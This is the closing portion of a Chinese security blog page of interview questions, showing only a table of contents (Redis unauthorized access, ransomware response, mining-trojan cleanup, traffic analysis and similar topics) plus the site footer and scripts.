href="#Redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">62.</span> <span class="toc-text">Redis 未授权漏洞利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">63.</span> <span class="toc-text">Redis 未授权漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hadoop-%E7%BB%84%E4%BB%B6%E4%B8%8E%E7%9B%B8%E5%85%B3%E7%AB%AF%E5%8F%A3"><span class="toc-number">64.</span> <span class="toc-text">Hadoop 组件与相关端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%87%E8%AE%BE%E5%AE%A2%E6%88%B7%E4%B8%AD%E4%BA%86-GhostPetya-%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%EF%BC%8C%E8%AF%B7%E6%8F%8F%E8%BF%B0%E9%9C%80%E8%A6%81%E9%87%87%E5%8F%96%E7%9A%84%E5%BA%94%E6%80%A5%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="toc-number">65.</span> <span class="toc-text">假设客户中了 GhostPetya 勒索病毒，请描述需要采取的应急解决方案</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%8E%92%E6%9F%A5%E5%B8%B8%E8%A7%81%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC"><span class="toc-number">66.</span> <span class="toc-text">如何排查常见挖矿木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ddos-%E6%94%BB%E5%87%BB%E5%A6%82%E4%BD%95%E5%8E%BB%E9%98%B2%E8%8C%83"><span class="toc-number">67.</span> <span class="toc-text">ddos 攻击如何去防范</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%B8%85%E6%9F%A5%E4%BA%92%E8%81%94%E7%BD%91%E6%9A%B4%E9%9C%B2%E9%9D%A2"><span class="toc-number">68.</span> <span class="toc-text">如何清查互联网暴露面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%BC%80%E5%B1%95%E6%89%AB%E6%8F%8F%E4%BB%BB%E5%8A%A1"><span class="toc-number">69.</span> <span class="toc-text">如何开展扫描任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E5%B9%B6%E6%83%B3%E8%A6%81%E6%88%91%E6%96%B9%E5%B8%AE%E5%BF%99%E4%BF%AE%E5%A4%8D%E6%BC%8F%E6%B4%9E%EF%BC%8C%E6%AD%A4%E5%9C%BA%E6%99%AF%E6%80%8E%E4%B9%88%E5%A4%84%E7%90%86"><span class="toc-number">70.</span> <span class="toc-text">客户并想要我方帮忙修复漏洞，此场景怎么处理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E4%BB%BB%E5%8A%A1%E7%BB%93%E6%9D%9F%E5%90%8E%E6%88%91%E5%8F%B8%E5%8F%91%E7%BB%93%E6%9E%9C%E7%BB%99%E5%AE%A2%E6%88%B7%E6%97%B6%EF%BC%8C%E9%81%97%E6%BC%8F%E4%BA%86%E6%9F%90%E4%B8%AA%E6%BC%8F%E6%B4%9E%EF%BC%8C%E5%A6%82%E4%BD%95%E7%BB%99%E5%AE%A2%E6%88%B7%E8%A7%A3%E9%87%8A%E5%A4%84%E7%90%86"><span class="toc-number">71.</span> <span class="toc-text">安全任务结束后我司发结果给客户时，遗漏了某个漏洞，如何给客户解释处理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%A2%AB%E6%8C%96%E7%9F%BF%E7%9A%84%E5%8E%9F%E5%9B%A0"><span class="toc-number">72.</span> <span class="toc-text">服务器被挖矿的原因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%B8%85%E9%99%A4%E6%8C%96%E7%9F%BF%E6%9C%A8%E9%A9%AC"><span class="toc-number">73.</span> <span class="toc-text">如何清除挖矿木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81Webshell-%E6%B5%81%E9%87%8F%E4%BA%A4%E4%BA%92%E7%9A%84%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E6%9C%89%E5%93%AA%E4%BA%9B"><span class="toc-number">74.</span> <span class="toc-text">1、Webshell 流量交互的流量特征有哪些</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%B9%E9%87%8F%E6%A3%80%E6%9F%A5-http-%E6%9C%8D%E5%8A%A1%E4%BD%BF%E7%94%A8%E4%BB%80%E4%B9%88%E5%B7%A5%E5%85%B7%E5%92%8C%E7%AE%80%E7%95%A5%E4%BD%BF%E7%94%A8%E6%AD%A5%E9%AA%A4"><span class="toc-number">75.</span> <span class="toc-text">批量检查 http 服务使用什么工具和简略使用步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%98%E6%B4%BB%E6%80%A7%E6%8E%A2%E6%B5%8B%E7%9A%84%E7%AE%80%E8%A6%81%E6%AD%A5%E9%AA%A4"><span class="toc-number">76.</span> <span class="toc-text">存活性探测的简要步骤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%87%E8%AE%BE%E5%8F%91%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9F%AD%E6%97%B6%E9%97%B4%E5%86%85%E6%9F%A5%E8%AF%A2%E5%BC%82%E5%B8%B8%E6%AC%A1%E6%95%B0%E5%A2%9E%E5%A4%9A%EF%BC%8C%E6%8F%8F%E8%BF%B0-sql-%E6%9F%A5%E8%AF%A2%E5%BC%82%E5%B8%B8%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="toc-number">77.</span> <span class="toc-text">假设发现数据库短时间内查询异常次数增多，描述 sql 查询异常流量分析的思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%8F%E8%BF%B0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E6%BA%AF%E6%BA%90%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="toc-number">78.</span> <span class="toc-text">描述流量分析溯源的思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wireshark-%E7%AE%80%E5%8D%95%E7%9A%84%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99"><span class="toc-number">79.</span> <span class="toc-text">wireshark 简单的过滤规则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%BB%99%E5%88%B0%E4%BD%A0%E6%9C%89-50-%E4%B8%87%E4%B8%AA-ip%EF%BC%8C%E8%A6%81%E6%B1%82%E4%BD%A0%E4%B8%A4%E5%91%A8%E5%86%85%E5%81%9A%E5%AE%8C%E5%85%A8%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%EF%BC%8C%E4%BD%A0%E4%BC%9A%E6%80%8E%E4%B9%88%E5%81%9A"><span class="toc-number">80.</span> <span class="toc-text">客户给到你有 50 万个 ip，要求你两周内做完全端口扫描，你会怎么做</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84%E5%8F%96%E8%AF%81%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7"><span class="toc-number">81.</span> <span class="toc-text">常见的取证分析工具</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://godreams.cn/2024/03/03/work/workpre2/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://godreams.cn/2024/03/03/work/workpre2/&text=【工作】面试题整理 常见问题"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://godreams.cn/2024/03/03/work/workpre2/&title=【工作】面试题整理 常见问题"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godreams.cn/2024/03/03/work/workpre2/&is_video=false&description=【工作】面试题整理 常见问题"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=【工作】面试题整理 常见问题&body=Check out this article: https://godreams.cn/2024/03/03/work/workpre2/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://godreams.cn/2024/03/03/work/workpre2/&title=【工作】面试题整理 常见问题"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://godreams.cn/2024/03/03/work/workpre2/&title=【工作】面试题整理 常见问题"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://godreams.cn/2024/03/03/work/workpre2/&title=【工作】面试题整理 常见问题"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://godreams.cn/2024/03/03/work/workpre2/&title=【工作】面试题整理 常见问题"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://godreams.cn/2024/03/03/work/workpre2/&name=【工作】面试题整理 常见问题&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://godreams.cn/2024/03/03/work/workpre2/&t=【工作】面试题整理 常见问题"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024-2025
    g0dam
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/idea/">Idea</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

    <script type="text/javascript">
      var utterances_repo = 'owner/githubrepo';
      var utterances_issue_term = 'pathname';
      var utterances_label = 'Comment';
      var utterances_theme = 'github-dark';

      (function(){
          var script = document.createElement('script');

          script.src = 'https://utteranc.es/client.js';
          script.setAttribute('repo', utterances_repo);
          script.setAttribute('issue-term', 'pathname');
          script.setAttribute('label', utterances_label);
          script.setAttribute('theme', utterances_theme);
          script.setAttribute('crossorigin', 'anonymous');
          script.async = true;
          (document.getElementById('utterances_thread')).appendChild(script);
      }());
  </script>

</body>
</html>
